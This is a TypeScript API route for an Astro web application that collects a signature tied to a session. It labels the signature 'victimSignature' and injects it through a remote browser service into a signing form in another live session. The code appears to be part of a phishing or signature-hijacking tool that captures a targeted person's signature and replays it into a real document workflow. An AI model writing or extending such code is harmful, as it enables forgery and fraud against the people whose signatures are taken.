import type { APIRoute } from 'astro';
import { getBrowserService } from '../../lib/services/remote-browser';
import { updateSession, getSession } from '../../lib/stores/signing-session';

export const POST: APIRoute = async ({ request }) => {
  try {
    const { sessionId, signatureData } = await request.json();
    
    if (!sessionId || !signatureData) {
      return new Response(JSON.stringify({
        error: 'Session ID and signature data are required'
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    const session = getSession(sessionId);
    if (!session) {
      return new Response(JSON.stringify({
        error: 'Session not found'
      }), {
        status: 404,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // Check if this is a PDF session
    if (session.sessionType === 'pdf') {
      // For PDF sessions, store the signature for finalization
      updateSession(sessionId, {
        signatureRequested: false,
        signatureCollected: true,
        victimSignature: signatureData,
        signatureCollectedAt: new Date().toISOString()
      });
      
      console.log(`PDF session ${sessionId}: Victim signature collected and stored`);
    } else {
      // For browser sessions, inject signature into the browser form
      updateSession(sessionId, {
        signatureRequested: false,
        signatureCollected: true
      });
      
      const browserService = getBrowserService();
      const browserSession = browserService.getSession(sessionId);
      
      if (browserSession) {
        try {
          const injectionResult = await browserService.injectSignature(sessionId, signatureData);
          console.log('Signature injection result:', injectionResult);
          
          // Update session with injection details
          updateSession(sessionId, {
            signatureInjected: true,
            injectionMethod: injectionResult.method,
            injectionPattern: injectionResult.pattern
          });
        } catch (error) {
          console.error('Failed to inject signature:', error);
          // Continue anyway - signature is collected
          updateSession(sessionId, {
            signatureInjected: false,
            injectionError: error.message
          });
        }
      }
    }
    
    return new Response(JSON.stringify({
      success: true,
      message: 'Signature collected and injected'
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    console.error('Customer signature submit error:', error);
    return new Response(JSON.stringify({
      error: 'Failed to submit signature'
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
};